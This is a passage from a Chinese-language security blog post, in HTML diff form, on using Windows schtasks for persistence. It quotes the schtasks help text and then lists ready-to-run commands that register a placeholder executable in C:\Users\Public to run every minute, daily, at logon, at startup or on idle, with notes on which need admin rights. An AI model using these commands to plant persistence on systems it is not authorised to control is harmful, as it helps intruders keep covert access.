+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Windows操作系统提供了一个实用程序(schtasks.exe)，使用户能够在特定的日期和时间或条件中去执行程序或脚本。这种行为可作为一种持久性机制运行在权限维持需求上。操作Windows计划任务不需要管理员权限，但如果已获得比较高的系统权限，则可以进一步操纵，例如在用户登录期间或在空间状态期间执行任务</p>
+<ul>
+<li>图形化工具：taskschd.msc</li>
+<li>命令行工具：schtasks.exe</li>
+</ul>
+<h3 id="schtasks的使用" class="heading-element"><span>schtasks的使用</span>
+  <a href="#schtasks%e7%9a%84%e4%bd%bf%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Windows\System32&gt;schtasks /?  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">SCHTASKS /parameter [arguments]  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">描述:  
+</span></span><span class="line"><span class="cl">    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任  
+</span></span><span class="line"><span class="cl">    务。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">参数列表:  
+</span></span><span class="line"><span class="cl">    /Create         创建新计划任务。  
+</span></span><span class="line"><span class="cl">    /Delete         删除计划任务。  
+</span></span><span class="line"><span class="cl">    /Query          显示所有计划任务。  
+</span></span><span class="line"><span class="cl">    /Change         更改计划任务属性。  
+</span></span><span class="line"><span class="cl">    /Run            按需运行计划任务。  
+</span></span><span class="line"><span class="cl">    /End            中止当前正在运行的计划任务。  
+</span></span><span class="line"><span class="cl">    /ShowSid        显示与计划的任务名称相应的安全标识符。  
+</span></span><span class="line"><span class="cl">    /?              显示此帮助消息。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">Examples:  
+</span></span><span class="line"><span class="cl">    SCHTASKS  
+</span></span><span class="line"><span class="cl">    SCHTASKS /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /Run /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /End /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /Create /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /Delete /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /Query  /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /Change /?  
+</span></span><span class="line"><span class="cl">    SCHTASKS /ShowSid /?  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>添加定时任务</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\f10wers13eicheng&gt;schtasks /create /?  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">SCHTASKS /Create [/S system [/U username [/P [password]]]]  
+</span></span><span class="line"><span class="cl">    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]  
+</span></span><span class="line"><span class="cl">    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]  
+</span></span><span class="line"><span class="cl">    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]  
+</span></span><span class="line"><span class="cl">    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">描述:  
+</span></span><span class="line"><span class="cl">     允许管理员在本地或远程系统上创建计划任务。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">参数列表:  
+</span></span><span class="line"><span class="cl">    /S   system        指定要连接到的远程系统。如果省略这个  
+</span></span><span class="line"><span class="cl">                       系统参数，默认是本地系统。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /U   username      指定应在其中执行 SchTasks.exe 的用户上下文。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /P   [password]    指定给定用户上下文的密码。如果省略则  
+</span></span><span class="line"><span class="cl">                       提示输入。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /RU  username      指定任务在其下运行的“运行方式”用户  
+</span></span><span class="line"><span class="cl">                       帐户(用户上下文)。对于系统帐户，有效  
+</span></span><span class="line"><span class="cl">                       值是 &#34;&#34;、&#34;NT AUTHORITY\SYSTEM&#34; 或  
+</span></span><span class="line"><span class="cl">                       &#34;SYSTEM&#34;。  
+</span></span><span class="line"><span class="cl">                       对于 v2 任务，&#34;NT AUTHORITY\LOCALSERVICE&#34;和  
+</span></span><span class="line"><span class="cl">                       &#34;NT AUTHORITY\NETWORKSERVICE&#34;以及常见的 SID  
+</span></span><span class="line"><span class="cl">                         对这三个也都可用。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /RP  [password]    指定“运行方式”用户的密码。要提示输  
+</span></span><span class="line"><span class="cl">                       入密码，值必须是 &#34;*&#34; 或无。系统帐户会忽略该  
+</span></span><span class="line"><span class="cl">                       密码。必须和 /RU 或 /XML 开关一起使用。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">/RU/XML    /SC   schedule     指定计划频率。  
+</span></span><span class="line"><span class="cl">                       有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、  
+</span></span><span class="line"><span class="cl">                       MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /MO   modifier     改进计划类型以允许更好地控制计划重复  
+</span></span><span class="line"><span class="cl">                       周期。有效值列于下面“修改者”部分中。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /D    days         指定该周内运行任务的日期。有效值:  
+</span></span><span class="line"><span class="cl">                       MON、TUE、WED、THU、FRI、SAT、SUN  
+</span></span><span class="line"><span class="cl">                       和对 MONTHLY 计划的 1 - 31  
+</span></span><span class="line"><span class="cl">                       (某月中的日期)。通配符“*”指定所有日期。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /M    months       指定一年内的某月。默认是该月的第一天。  
+</span></span><span class="line"><span class="cl">                       有效值: JAN、FEB、MAR、APR、MAY、JUN、  
+</span></span><span class="line"><span class="cl">                       JUL、 AUG、SEP、OCT、NOV  和 DEC。通配符  
+</span></span><span class="line"><span class="cl">                       “*” 指定所有的月。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /I    idletime     指定运行一个已计划的 ONIDLE 任务之前  
+</span></span><span class="line"><span class="cl">                       要等待的空闲时间。  
+</span></span><span class="line"><span class="cl">                       有效值范围: 1 到 999 分钟。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /TN   taskname     以路径\名称形式指定  
+</span></span><span class="line"><span class="cl">                       对此计划任务进行唯一标识的字符串。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /TR   taskrun      指定在这个计划时间运行的程序的路径  
+</span></span><span class="line"><span class="cl">                       和文件名。  
+</span></span><span class="line"><span class="cl">                       例如: C:\windows\system32\calc.exe  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /ST   starttime    指定运行任务的开始时间。  
+</span></span><span class="line"><span class="cl">                       时间格式为 HH:mm (24 小时时间)，例如 14:30 表示  
+</span></span><span class="line"><span class="cl">                       2:30 PM。如果未指定 /ST，则默认值为  
+</span></span><span class="line"><span class="cl">                       当前时间。/SC ONCE 必需有此选项。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /RI   interval     用分钟指定重复间隔。这不适用于  
+</span></span><span class="line"><span class="cl">                       计划类型: MINUTE、HOURLY、  
+</span></span><span class="line"><span class="cl">                       ONSTART, ONLOGON, ONIDLE, ONEVENT.  
+</span></span><span class="line"><span class="cl">                       有效范围: 1 - 599940 分钟。  
+</span></span><span class="line"><span class="cl">                       如果已指定 /ET 或 /DU，则其默认值为  
+</span></span><span class="line"><span class="cl">                       10 分钟。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /ET   endtime      指定运行任务的结束时间。  
+</span></span><span class="line"><span class="cl">                       时间格式为 HH:mm (24 小时时间)，例如，14:50 表示 2:50 PM。  
+</span></span><span class="line"><span class="cl">                       这不适用于计划类型: ONSTART、  
+</span></span><span class="line"><span class="cl">                       ONLOGON, ONIDLE, ONEVENT.  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /DU   duration     指定运行任务的持续时间。  
+</span></span><span class="line"><span class="cl">                       时间格式为 HH:mm。这不适用于 /ET 和  
+</span></span><span class="line"><span class="cl">                       计划类型: ONSTART, ONLOGON, ONIDLE, ONEVENT.  
+</span></span><span class="line"><span class="cl">                       对于 /V1 任务，如果已指定 /RI，则持续时间默认值为  
+</span></span><span class="line"><span class="cl">                       1 小时。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /K                 在结束时间或持续时间终止任务。  
+</span></span><span class="line"><span class="cl">                       这不适用于计划类型: ONSTART、  
+</span></span><span class="line"><span class="cl">                       ONLOGON, ONIDLE, ONEVENT.  
+</span></span><span class="line"><span class="cl">                       必须指定 /ET 或 /DU。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /SD   startdate    指定运行任务的第一个日期。  
+</span></span><span class="line"><span class="cl">                       格式为 yyyy/mm/dd。默认值为  
+</span></span><span class="line"><span class="cl">                       当前日期。这不适用于计划类型: ONCE、  
+</span></span><span class="line"><span class="cl">                       ONSTART, ONLOGON, ONIDLE, ONEVENT.  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /ED   enddate      指定此任务运行的最后一天的日期。  
+</span></span><span class="line"><span class="cl">                       格式是 yyyy/mm/dd。这不适用于计划类型:  
+</span></span><span class="line"><span class="cl">                        ONCE、ONSTART、ONLOGON、ONIDLE。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /EC   ChannelName  为 OnEvent 触发器指定事件通道。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /IT                仅有在 /RU 用户当前已登录且  
+</span></span><span class="line"><span class="cl">                       作业正在运行时才可以交互式运行任务。  
+</span></span><span class="line"><span class="cl">                       此任务只有在用户已登录的情况下才运行。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /NP                不储存任何密码。任务以给定用户的身份  
+</span></span><span class="line"><span class="cl">                       非交互的方式运行。只有本地资源可用。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /Z                 标记在最终运行完任务后删除任务。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /XML  xmlfile      从文件的指定任务 XML 中创建任务。  
+</span></span><span class="line"><span class="cl">                       可以组合使用 /RU 和 /RP 开关，或者在任务 XML 已包含  
+</span></span><span class="line"><span class="cl">                       主体时单独使用 /RP。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /V1                创建 Vista 以前的平台可以看见的任务。  
+</span></span><span class="line"><span class="cl">                       不兼容 /XML。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /F                 如果指定的任务已经存在，则强制创建  
+</span></span><span class="line"><span class="cl">                       任务并抑制警告。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /RL   level        为作业设置运行级别。有效值为  
+</span></span><span class="line"><span class="cl">                       LIMITED 和 HIGHEST。默认值为 LIMITED。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /DELAY delaytime   指定触发触发器后延迟任务运行的  
+</span></span><span class="line"><span class="cl">                       等待时间。时间格式为  
+</span></span><span class="line"><span class="cl">                       mmmm:ss。此选项仅对计划类型  
+</span></span><span class="line"><span class="cl">                       ONSTART, ONLOGON, ONEVENT.  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /HRESULT          为获得更出色的故障诊断能力，处理退出代码  
+</span></span><span class="line"><span class="cl">                       将采用 HRESULT 格式。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    /?                 显示此帮助消息。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">修改者: 按计划类型的 /MO 开关的有效值:  
+</span></span><span class="line"><span class="cl">    MINUTE:  1 到 1439 分钟。  
+</span></span><span class="line"><span class="cl">    HOURLY:  1 - 23 小时。  
+</span></span><span class="line"><span class="cl">    DAILY:   1 到 365 天。  
+</span></span><span class="line"><span class="cl">    WEEKLY:  1 到 52 周。  
+</span></span><span class="line"><span class="cl">    ONCE:    无修改者。  
+</span></span><span class="line"><span class="cl">    ONSTART: 无修改者。  
+</span></span><span class="line"><span class="cl">    ONLOGON: 无修改者。  
+</span></span><span class="line"><span class="cl">    ONIDLE:  无修改者。  
+</span></span><span class="line"><span class="cl">    MONTHLY: 1 到 12，或  
+</span></span><span class="line"><span class="cl">             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ONEVENT:  XPath 事件查询字符串。  
+</span></span><span class="line"><span class="cl">示例:  
+</span></span><span class="line"><span class="cl">    ==&gt; 在远程机器 &#34;ABC&#34; 上创建计划任务 &#34;doc&#34;，  
+</span></span><span class="line"><span class="cl">        该机器每小时在 &#34;runasuser&#34; 用户下运行 notepad.exe。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /S ABC /U user /P password /RU runasuser  
+</span></span><span class="line"><span class="cl">                 /RP runaspassword /SC HOURLY /TN doc /TR notepad  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ==&gt; 在远程机器 &#34;ABC&#34; 上创建计划任务 &#34;accountant&#34;，  
+</span></span><span class="line"><span class="cl">        在指定的开始日期和结束日期之间的开始时间和结束时间内，  
+</span></span><span class="line"><span class="cl">        每隔五分钟运行 calc.exe。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE  
+</span></span><span class="line"><span class="cl">                 /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00  
+</span></span><span class="line"><span class="cl">                 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ==&gt; 创建计划任务 &#34;gametime&#34;，在每月的第一个星期天  
+</span></span><span class="line"><span class="cl">        运行“空当接龙”。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime  
+</span></span><span class="line"><span class="cl">                 /TR c:\windows\system32\freecell  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ==&gt; 在远程机器 &#34;ABC&#34; 创建计划任务 &#34;report&#34;，  
+</span></span><span class="line"><span class="cl">        每个星期运行 notepad.exe。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /S ABC /U user /P password /RU runasuser  
+</span></span><span class="line"><span class="cl">                 /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ==&gt; 在远程机器 &#34;ABC&#34; 创建计划任务 &#34;logtracker&#34;，  
+</span></span><span class="line"><span class="cl">        每隔五分钟从指定的开始时间到无结束时间，  
+</span></span><span class="line"><span class="cl">        运行 notepad.exe。将提示输入 /RP  
+</span></span><span class="line"><span class="cl">        密码。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE  
+</span></span><span class="line"><span class="cl">                 /MO 5 /TN logtracker  
+</span></span><span class="line"><span class="cl">                 /TR c:\windows\system32\notepad.exe /ST 18:30  
+</span></span><span class="line"><span class="cl">                 /RU runasuser /RP  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    ==&gt; 创建计划任务 &#34;gaming&#34;，每天从 12:00 点开始到  
+</span></span><span class="line"><span class="cl">        14:00 点自动结束，运行 freecell.exe。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00  
+</span></span><span class="line"><span class="cl">                 /ET 14:00 /K  
+</span></span><span class="line"><span class="cl">    ==&gt; 创建计划任务“EventLog”以开始运行 wevtvwr.msc  
+</span></span><span class="line"><span class="cl">        只要在“系统”通道中发布事件 101  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT  
+</span></span><span class="line"><span class="cl">                 /EC System /MO *[System/EventID=101]  
+</span></span><span class="line"><span class="cl">    ==&gt; 文件路径中可以加入空格，但需要加上两组引号，  
+</span></span><span class="line"><span class="cl">        一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD  
+</span></span><span class="line"><span class="cl">        的外部引号必须是一对双引号；内部引号可以是一对单引号或  
+</span></span><span class="line"><span class="cl">        一对转义双引号:  
+</span></span><span class="line"><span class="cl">        SCHTASKS /Create  
+</span></span><span class="line"><span class="cl">           /tr &#34;&#39;c:\program files\internet explorer\iexplorer.exe&#39;  
+</span></span><span class="line"><span class="cl">           \&#34;c:\log data\today.xml\&#34;&#34; ...  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用案例</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">非管理员权限如下  
+</span></span><span class="line"><span class="cl">/sc DAILY  
+</span></span><span class="line"><span class="cl">每间隔一天执行一次  
+</span></span><span class="line"><span class="cl">schtasks /create /tn scAutoRunTest /tr &#34;C:\USers\Public\scAutoRunTest.exe&#34; /SC daily /sd 1999/01/01 /ed 2099/12/31  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">/sc MINUTE  
+</span></span><span class="line"><span class="cl">每间隔一分钟执行一次，重启用户登录后过一分钟会执行一次  
+</span></span><span class="line"><span class="cl">schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc minute /st 00:00 /et 23:59  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">只执行一次，重启用户登录后执行一次（高低权限皆可使用/继承当前用户权限）  
+</span></span><span class="line"><span class="cl">schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc minute /st 00:00 /et 23:59 /mo 1 /f  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">管理员权限下  
+</span></span><span class="line"><span class="cl">/sc onlogon  
+</span></span><span class="line"><span class="cl">用户登录时执行  
+</span></span><span class="line"><span class="cl">schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc onlogon /f  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">/sc onstart  
+</span></span><span class="line"><span class="cl">系统启动时执行  
+</span></span><span class="line"><span class="cl">schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc onstart /f  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">On User Idle (5mins)  
+</span></span><span class="line"><span class="cl">schtasks /create /tn sctAutorunTest /tr &#34;C:\Users\Public\sctAutorunTest.exe&#34; /sc onidle /f /i 5  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">启动定时任务  
+</span></span><span class="line"><span class="cl">/tn 计划任务的名称  
